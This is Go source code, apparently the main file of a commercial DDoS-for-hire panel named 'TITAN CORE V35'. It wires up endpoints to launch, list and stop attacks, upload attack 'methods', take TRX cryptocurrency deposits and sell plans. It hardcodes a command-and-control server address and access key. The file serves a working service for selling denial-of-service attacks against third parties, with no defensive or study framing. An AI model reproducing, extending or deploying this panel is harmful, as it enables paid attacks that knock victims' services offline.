package main

import (
	"fmt"
	"log"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"github.com/dchest/captcha"
)

var (
	activeAttacks              = map[string]AttackData{}
	currentRPS, requestCounter uint64
	startTime                  time.Time

	limiterMu     sync.Mutex
	rateLimiter   = make(map[string]*RateLimitEntry)
	clients       = make(map[string]*ClientLimiter)
	clientsMu     sync.Mutex

	// NOTE: Methods are now loaded from the database (table: methods)
	// so the attack panel always reflects what admin configured.
	methods = map[string][]string{}

	mu                sync.Mutex
	walletMu          sync.Mutex
	lastKnownTrxPrice float64 = 0.20
)

var cfg = AppConfig{
	SessionDuration: 24 * time.Hour,
	C2Host:          "http://171.244.61.82:5000",
	C2Key:           "GOD_MODE_SECURE_TOKEN_999",
	BinanceAPI:      "https://api.binance.com/api/v3/ticker/price?symbol=TRXUSDT",
	MaxTrxPrice:     5.0,
	MinTrxPrice:     0.01,
	ReferralPercent: 0.10,
}

func main() {
	initDB()
	startTime = time.Now()
	go resetC2()

	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			db.Exec("DELETE FROM sessions WHERE expires < ?", time.Now().Unix())
			atomic.StoreUint64(&currentRPS, atomic.SwapUint64(&requestCounter, 0))
			mu.Lock()
			now := time.Now()
			for id, atk := range activeAttacks {
				if now.After(atk.EndTime) {
					delete(activeAttacks, id)
				}
			}
			mu.Unlock()
			db.Exec("UPDATE deposits SET status='Expired' WHERE status='Pending' AND expires < ?", time.Now())
			db.Exec("UPDATE wallets SET status='Free', assigned_to='' WHERE assigned_to IN (SELECT id FROM deposits WHERE status='Expired')")
		}
	}()

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		setSecurityHeaders(w)
		if r.URL.Path != "/" {
			http.Redirect(w, r, "/", 302)
			return
		}
		renderTemplate(w, "landing.html", nil)
	})

	http.Handle("/captcha/", captcha.Server(240, 80))
	http.HandleFunc("/login", handleLogin)
	http.HandleFunc("/register", handleRegister)
	http.HandleFunc("/logout", handleLogout)
	http.HandleFunc("/admin", handleAdminPage)

	for _, p := range []string{"dashboard", "panel", "status", "deposit", "market", "support", "documentation", "profile"} {
		http.HandleFunc("/"+p, handlePage(p+".html"))
	}

	http.HandleFunc("/invoice", handleInvoicePage)
	http.HandleFunc("/api/deposit/create", handleCreateDeposit)
	http.HandleFunc("/api/deposit/check", handleCheckDeposit)
	http.HandleFunc("/api/admin/add-wallet", handleAddWallet)
	http.HandleFunc("/api/admin/del-wallet", handleDelWallet)
	http.HandleFunc("/api/market/purchase", handlePurchase)
	http.HandleFunc("/api/user/info", handleUserInfo)
	http.HandleFunc("/api/captcha/new", handleNewCaptcha)
	http.HandleFunc("/api/attack", handlePanelAttack)
	http.HandleFunc("/api/attack/list", apiList)
	http.HandleFunc("/api/attack/stop", apiStop)
	http.HandleFunc("/api/attack/stopAll", apiStopAll)
	http.HandleFunc("/api/admin/gen-code", handleGenCode)
	http.HandleFunc("/api/admin/config-plans", handleConfigPlans)
	http.HandleFunc("/api/admin/add-product", handleAddProduct)
	http.HandleFunc("/api/admin/del-product", handleDelProduct)
	http.HandleFunc("/api/admin/blacklist", handleBlacklistOp)
	http.HandleFunc("/api/admin/upload-method", handleUploadMethod)
	http.HandleFunc("/api/admin/deposit/action", handleDepositAction)
	http.HandleFunc("/api/ticket/create", handleCreateTicket)
	http.HandleFunc("/api/ticket/reply", handleReplyTicket)
	// Profile/account APIs
	http.HandleFunc("/api/user/change-password", handleChangePassword)
	http.HandleFunc("/api/user/token/rotate", handleRotateToken)
	http.HandleFunc("/api/user/sessions", handleListSessions)
	http.HandleFunc("/api/user/sessions/revoke", handleRevokeSession)
	http.HandleFunc("/api/user/sessions/revoke-all", handleRevokeAllSessions)
	// Public token API
	http.HandleFunc("/api/launch", apiLaunch)
	http.HandleFunc("/redeem-login", handleRedeemLogin)

	fmt.Println(">> [TITAN CORE V35 - MODULAR] :8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal("Server failed:", err)
	}
}
